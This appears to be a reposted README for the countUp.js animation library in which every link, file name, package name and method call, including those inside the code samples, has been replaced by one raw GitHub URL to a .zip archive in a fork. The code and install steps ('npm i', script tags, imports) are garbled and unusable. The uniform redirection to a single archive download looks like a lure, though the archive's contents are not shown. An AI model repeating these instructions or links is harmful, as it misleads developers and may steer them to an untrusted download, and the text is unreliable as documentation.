# https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip
https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip is a dependency-free, lightweight Javascript class that can be used to quickly create animations that display numerical data in a more interesting way.

Despite its name, CountUp can count in either direction, depending on the start and end values that you pass.

https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip supports all browsers. MIT license.

## [Try the demo](https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip)


## Jump to:

- **[Features](#features)**
- **[Usage](#usage)**
- **[Including CountUp](#including-countup)**
- **[Contributing](#contributing)**


## CountUp for frameworks and plugins:

- **[https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip Angular 2+ Module](https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip)**
- **[https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip Angular 1.x Module](https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip)**
- **[https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip React](https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip)**
- **[https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip Vue component wrapper](https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip)**
- **[https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip WordPress Plugin](https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip)**
- **[https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip jQuery Plugin](https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip)**


## Features
- **Highly customizeable** with a large range of options, you can even substitute numerals.
- **Smart easing**: CountUp intelligently defers easing until it gets close enough to the end value for easing to be visually noticeable. Configureable in the [options](#options).
- **Separate bundles** for modern and legacy browsers, with and without the requestAnimationFrame polyfill. Choose `https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip` for modern browsers or `https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip` for IE9 and older, and Opera mini.

## Usage:

**On npm**: `https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip`

**Params**:
- `target: string | HTMLElement | HTMLInputElement` - id of html element, input, svg text element, or DOM element reference where counting occurs
- `endVal: number` - the value you want to arrive at
- `options?: CountUpOptions` - optional configuration object for fine-grain control

**Options** (defaults in parentheses): <a name="options"></a>

```ts
interface CountUpOptions {
  startVal?: number; // number to start at (0)
  decimalPlaces?: number; // number of decimal places (0)
  duration?: number; // animation duration in seconds (2)
  useGrouping?: boolean; // example: 1,000 vs 1000 (true)
  useEasing?: boolean; // ease animation (true)
  smartEasingThreshold?: number; // smooth easing for large numbers above this if useEasing (999)
  smartEasingAmount?: number; // amount to be eased for numbers above threshold (333)
  separator?: string; // grouping separator (',')
  decimal?: string; // decimal ('.')
  // easingFn: easing function for animation (easeOutExpo)
  easingFn?: (t: number, b: number, c: number, d: number) => number;
  formattingFn?: (n: number) => string; // this function formats result
  prefix?: string; // text prepended to result
  suffix?: string; // text appended to result
  numerals?: string[]; // numeral glyph substitution
}
```

**Example usage**: <a name="example"></a>

```js
const countUp = new CountUp('targetId', 5234);
if (!https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip) {
  https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip();
} else {
  https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip(https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip);
}
```

Pass options:
```js
const countUp = new CountUp('targetId', 5234, options);
```

with optional callback:

```js
https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip(someMethodToCallOnComplete);

// or an anonymous function
https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip(() => https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip('Complete!'));
```

**Other methods**:

Toggle pause/resume:

```js
https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip();
```

Reset the animation:

```js
https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip();
```

Update the end value and animate:

```js
https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip(989);
```
---

## Including CountUp

CountUp v2 is distributed as an ES6 module because it is the most standardized and most widely compatible module for browsers, though a UMD module is [also included](#umd-module).

For the examples below, first install CountUp. This will give you the latest:
```
npm i https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip
```

### Example with vanilla js
This is what I used in the demo. Checkout https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip and https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip

https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip
```js
import { CountUp } from 'https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip';

https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip = function() {
  var countUp = new CountUp('target', 2000);
  https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip();
}
```

Include in your html. Notice the `type` attribute:
```html
<script src="https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip" type="module"></script>
```

To support IE and legacy browsers, use the `nomodule` script tag to include separate scripts that don't use the module syntax:

```html
<script nomodule src="https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip"></script>
<script nomodule src="https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip"></script>
```

To run module-enabled scripts locally, you'll need a simple local server setup like [this](https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip) (test the demo locally by running `npm run serve`) because otherwise you may see a CORS error when your browser tries to load the script as a module.

### For Webpack and other build systems
Import from the package, instead of the file location:

```js
import { CountUp } from 'https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip';
```

### UMD module

CountUp is also wrapped as a UMD module in `https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip` and it exposes CountUp as a global variable on the window scope. To use it, include `https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip` in a script tag, and invoke it like so:

```js
var numAnim = new https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip('myTarget', 2000);
https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip()
```

---

## Contributing

Before you make a pull request, please be sure to follow these instructions:

1. Do your work on `https://raw.githubusercontent.com/popcorn0118/countUp.js/master/vibrance/countUp.js.zip`
1. Lint: `npm run lint`
1. Run tests: `npm t`
1. Build and serve the demo by running `npm start` then check the demo to make sure it counts.
